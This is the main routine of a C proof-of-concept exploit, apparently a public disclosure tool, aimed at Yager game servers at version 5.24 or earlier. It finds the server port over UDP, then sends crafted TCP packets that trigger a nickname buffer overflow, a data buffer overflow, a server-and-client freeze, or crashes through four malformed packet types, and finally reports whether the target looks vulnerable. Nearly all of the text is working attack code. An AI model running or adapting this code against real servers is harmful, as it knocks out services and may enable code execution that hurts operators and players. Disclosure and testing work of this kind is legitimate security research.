int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            tmp,
            autoport = 1;
    u_short port = PORT;
    u_char  *buff,
            info[] =
                "Y_NET_YAGER_CLIENT\0"
                "\x00\x00" "\x00\x00",
            *p;
    struct yager_head {
        u_long  type;
        u_short size;
        u_short pck1;
        u_short pck2;
    } *yh;


    setbuf(stdout, NULL);

    fputs("\n"
        "Yager <= 5.24 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: [email protected]\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(auto)]\n"
            "\n"
            "Attacks:\n"
            " 1 = nickname buffer-overflow\n"
            " 2 = big data buffer-overflow\n"
            " 3 = freeze of server and connected clients\n"
            " 4 = crash using type 0x1d (in 0x0050e970)\n"
            " 5 = crash using type 0x22 (in 0x004fd2b8)\n"
            " 6 = crash using type 0x24 (in 0x004fd2f5)\n"
            " 7 = crash using type 0x28 (in 0x004b0f1b)\n"
            "\n", argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 3) {
        autoport = 0;
        port = atoi(argv[3]);
    }

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(autoport) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        fputs("- request informations:\n", stdout);
        *(u_short *)(info + 19) = ~time(NULL);
        SENDTO(info);
        RECVFROM;
        close(sd);

        p = buff + 19;
        port = ntohs(*(u_short *)p);
        printf("\n  Server port   %d\n", port);
        p += 2;
        SHOW("  Map           ");
        printf("  Version       %d.%d\n", p[1], p[0]);
        p += 2;
        SHOW("  Server name   ");
        p += 4;
        printf("  Players       %d / %d\n\n", p[1], p[0]);

        peer.sin_port = htons(port);
    }

    attack = atoi(argv[1]);
    if(attack > 7) {
        fputs("\nError: you have chosen a wrong attack number\n\n", stdout);
        exit(1);
    }

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    yh = (struct yager_head *)buff;
    yh->pck1 = tmp = ~time(NULL) & 0xffff;
    yh->pck2 = 0;

    if(attack == 1) {
        yh->type = 0x1e;
        memcpy(buff + HEADSZ, NICKBOF, sizeof(NICKBOF) - 1);
        yh->size = sizeof(NICKBOF) - 1;
        fputs("- send long data block for nickname buffer-overflow\n", stdout);

    } else if(attack == 2) {
        yh->type = 0x00;    // almost any other type is ok
        memcpy(buff + HEADSZ, PCKBOF, sizeof(PCKBOF) - 1);
        yh->size = sizeof(PCKBOF) - 1;
        fputs("- send long data block for packet buffer-overflow\n", stdout);

    } else if(attack == 3) {
        yh->type = 0x1b;
        yh->size = 0;
        printf("- server waits for %d bytes but we send a partial header\n", HEADSZ);
        tmp %= HEADSZ;
        if(tmp <= 0) tmp = 1;
        SEND(buff, tmp);
        fputs("  Server and connected clients should be freezed, press RETURN to stop the attack\n", stdout);
        fgetc(stdin);
        close(sd);
        return(0);

    } else {
        if(attack == 4) {
            yh->type = 0x1d;
        } else if(attack == 5) {
            yh->type = 0x22;
        } else if(attack == 6) {
            yh->type = 0x24;
        } else if(attack == 7) {
            yh->type = 0x28;
        }

        memset(buff + HEADSZ, 0xff, CRASHSZ);
        yh->size = CRASHSZ;
        printf("- send crash data with type 0x%08lx\n", yh->type);
    }

    SEND(buff, yh->size + HEADSZ);
    fputs("- check server status\n", stdout);
    if(!timeout(sd)) {
        if(recv(sd, buff, BUFFSZ, 0) < 0) {
            fputs("\nServer IS vulnerable!!!\n\n", stdout);
        } else {
            fputs("\nServer doesn't seem vulnerable\n\n", stdout);
        }
    } else {
        fputs("\nNo reply from the server, it is probably not vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}